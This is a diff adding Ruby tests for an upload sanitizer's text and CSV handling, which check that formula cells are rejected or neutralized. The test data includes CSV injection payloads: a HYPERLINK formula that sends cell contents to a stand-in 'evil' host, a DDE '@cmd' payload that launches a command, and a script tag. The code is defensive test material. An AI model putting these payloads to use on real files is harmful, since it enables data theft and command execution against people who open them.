@@ -293,6 +293,46 @@ class SanitizeTest < Minitest::Test
     assert_equal "16\n", IO.popen(['vipsheader', '-f', 'width', result.sanitized_path], err: File::NULL, &:read)
   end
 
+  # --- text / CSV ----------------------------------------------------------------------
+
+  TEXT = %w[text/plain text/csv text/tab-separated-values].freeze
+
+  def sanitize_text(text, name, **options) = sanitize(text, name, allowed_types: TEXT, **options)
+
+  def test_text_is_copied_unchanged
+    text = "\xEF\xBB\xBFname,total\nAda,-5\n".b
+    result, output = sanitize_text(text, 'a.csv')
+
+    assert result.safe?, result.detail
+    assert_equal text, output
+  end
+
+  def test_csv_formulas_are_rejected_unless_neutralized
+    csv = %(name,link\nAda,=HYPERLINK("http://evil/?"&A1)\n)
+
+    assert_equal :csv_formula, sanitize_text(csv, 'a.csv').first.reason
+  end
+
+  def test_csv_formulas_are_neutralized_on_request
+    csv = %(name,link,phone,n\n=SUM(1),"=HYPERLINK(""http://evil"")",+1 (555) 010,-5\n@cmd|' /C calc'!A0;\t -2+3*cmd|x\n)
+    result, output = sanitize_text(csv, 'a.csv', neutralize_csv_formulas: true)
+
+    assert result.safe?, result.detail
+    assert_equal %(name,link,phone,n\n'=SUM(1),"'=HYPERLINK(""http://evil"")",+1 (555) 010,-5\n'@cmd|' /C calc'!A0;\t '-2+3*cmd|x\n), output
+  end
+
+  # Quoting a quoted cell exposes the cells inside it to the output check.
+  def test_csv_formulas_inside_quoted_cells_are_neutralized_too
+    result, output = sanitize_text(%("=A(1),=B(2)",x\n), 'a.csv', neutralize_csv_formulas: true)
+
+    assert result.safe?, result.detail
+    assert_equal %("'=A(1),'=B(2)",x\n), output
+  end
+
+  def test_text_markup_is_still_rejected
+    assert_equal :text_markup, sanitize_text("<script>x</script>\n", 'a.txt', neutralize_csv_formulas: true).first.reason
+  end
+
   def test_unsafe_upload_writes_nothing
     result, output = sanitize(S.png + P, 'a.png')
 
